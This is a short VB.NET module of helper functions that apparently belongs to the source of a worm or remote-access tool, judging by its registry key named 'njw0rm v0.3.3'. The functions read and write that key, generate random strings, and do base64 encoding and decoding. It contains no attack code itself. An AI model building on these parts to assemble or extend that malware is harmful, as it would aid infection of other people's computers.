
Module FN
    Public F As Form1
    Public Function GTV(ByVal name As String, ByVal df As String) As String
        Return My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\njw0rm v0.3.3", name, df)
    End Function
    Public Sub STV(ByVal name As String, ByVal value As String)
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\njw0rm v0.3.3", name, value)
    End Sub
    Function RN(ByVal c As Integer) As String
        Randomize()
        Dim r As New Random
        Dim s As String = ""
        Dim k As String = "abcdefghijklmnopqrstuvwxyz"
        For i As Integer = 1 To c
            s += k(r.Next(0, k.Length))
        Next
        Return s
    End Function
    Public Function SB(ByRef S As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(S)
    End Function
    Public Function BS(ByRef B As Byte()) As String
        Return System.Text.Encoding.Default.GetString(B)
    End Function
    Public Function HM() As String
        Return My.Computer.Clock.LocalTime.ToString("[hh:mm:ss]")
    End Function
    Public Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(s))
    End Function
    Public Function DEB(ByRef s As String) As String
        Return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(s))
    End Function
End Module
